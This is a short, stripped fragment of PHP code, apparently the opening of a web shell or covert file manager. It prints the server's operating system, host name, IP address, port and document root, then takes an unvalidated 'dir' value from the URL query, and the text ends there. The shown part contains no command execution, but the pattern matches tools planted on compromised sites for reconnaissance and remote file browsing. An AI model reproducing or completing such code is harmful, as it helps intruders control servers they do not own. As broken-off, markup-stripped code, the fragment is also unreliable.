...
?><?php echo PHP_OS;?><?php echo $_SERVER['SERVER_NAME'];?><?php echo gethostbyname($_SERVER['SERVER_NAME']);?><?php echo date("y m d h:i:s",time());?><?php echo $_SERVER['SERVER_PORT'];?><?php echo $_SERVER['DOCUMENT_ROOT'];?><?php echo $_SERVER['DOCUMENT_ROOT'];?><?php
					$dir=@$_GET['dir'];
